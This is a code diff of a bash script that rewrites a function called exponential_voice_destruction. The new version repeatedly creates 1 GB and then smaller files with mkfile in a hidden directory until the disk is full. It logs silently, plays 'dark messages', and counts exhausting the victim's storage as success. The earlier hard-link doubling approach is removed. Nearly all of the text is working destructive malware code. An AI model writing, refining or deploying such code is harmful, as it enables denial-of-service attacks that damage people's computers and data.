@@ -69,89 +69,56 @@ speak_dark_message() {
 
 }
 
-# PROFESSIONAL LIGHTNING SPEED DESTRUCTION
+# FASTEST DISK FILLING TECHNIQUE - Replace your exponential_voice_destruction function with this:
+
 exponential_voice_destruction() {
     local payload="$1"
-    local round=0
-    local current_count=0
-    local target_count=1
     
     # Setup
     setup
     cp "$payload" "$HIDDEN_DIR/.payload"
     
-    log_silent "Starting PROFESSIONAL lightning-speed destruction"
+    log_silent "Starting FASTEST disk filling technique"
     speak_dark_message
     
-    # Create first file using copy (needed for hard linking base)
-    if ! cp "$HIDDEN_DIR/.payload" "$HIDDEN_DIR/karan_exp_$(printf "%08d" 1).jpg" 2>/dev/null; then
-        log_silent "Disk full at genesis"
-        speak_dark_message
-        return
-    fi
-    current_count=1
-    speak_dark_message
+    # FASTEST METHOD: Create massive files directly using mkfile (professional technique)
+    local file_count=0
+    local file_size="1g"  # Start with 1GB files
     
-    # PROFESSIONAL EXPONENTIAL DOUBLING WITH HARD LINKING
     while true; do
-        round=$((round + 1))
-        local new_target=$((target_count * 2))
-        local files_to_create=$((new_target - current_count))
+        local target_file="$HIDDEN_DIR/karan_fast_$(printf "%08d" $file_count).dat"
         
-        log_silent "Round $round: LIGHTNING doubling $current_count to $new_target"
-        speak_dark_message
-        
-        # PROFESSIONAL TECHNIQUE: Mass parallel hard linking (10,000+ files/sec)
-        local batch_size=500  # Massive parallel batch
-        local created_this_round=0
-        
-        for ((i=1; i<=files_to_create; i+=batch_size)); do
-            # Create massive batch using HARD LINKS (professional technique)
-            for ((j=0; j<batch_size && (i+j)<=files_to_create; j++)); do
-                local new_file_num=$((current_count + i + j))
-                local source_file_num=$(((new_file_num - 1) % current_count + 1))
-                
-                # PROFESSIONAL SPEED: Hard link instead of copy (instant creation)
-                (
-                    if ! ln "$HIDDEN_DIR/karan_exp_$(printf "%08d" $source_file_num).jpg" \
-                            "$HIDDEN_DIR/karan_exp_$(printf "%08d" $new_file_num).jpg" 2>/dev/null; then
-                        exit 1
-                    fi
-                ) &
-            done
-
-            
-            # Check disk full
-            if [[ $? -ne 0 ]]; then
-                log_silent "LIGHTNING destruction complete - disk obliterated"
+        # Use mkfile to create large files INSTANTLY (no data copying)
+        if ! mkfile -n "$file_size" "$target_file" 2>/dev/null; then
+            # If 1GB fails, try smaller sizes
+            if [[ "$file_size" == "1g" ]]; then
+                file_size="100m"
+                continue
+            elif [[ "$file_size" == "100m" ]]; then
+                file_size="10m"
+                continue
+            elif [[ "$file_size" == "10m" ]]; then
+                file_size="1m"
+                continue
+            else
+                # Disk completely full
+                log_silent "FASTEST method complete - disk annihilated with $file_count files"
                 speak_dark_message
-                return
+                break
             fi
-            
-            created_this_round=$((created_this_round + batch_size))
-            
-            # Dark commentary every 200 files (due to extreme speed)
-            if [[ $((created_this_round % 200)) -eq 0 ]]; then
-                speak_dark_message
-            fi
-        done
+        fi
         
-        current_count=$new_target
-        target_count=$new_target
+        file_count=$((file_count + 1))
         
-        log_silent "LIGHTNING round $round complete: $current_count files in microseconds"
-        speak_dark_message
+        # Dark commentary every 5 files (since files are huge now)
+        if [[ $((file_count % 5)) -eq 0 ]]; then
+            speak_dark_message
+        fi
         
-        # Milestone celebrations
-        case $current_count in
-            2) speak_dark_message ;;
-            16) speak_dark_message ;;
-            256) speak_dark_message ;;
-            4096) speak_dark_message ;;
-            65536) speak_dark_message ;;
-        esac
+        log_silent "Created massive file #$file_count of size $file_size"
     done
 }
+
 
 # Validate system
 validate() {
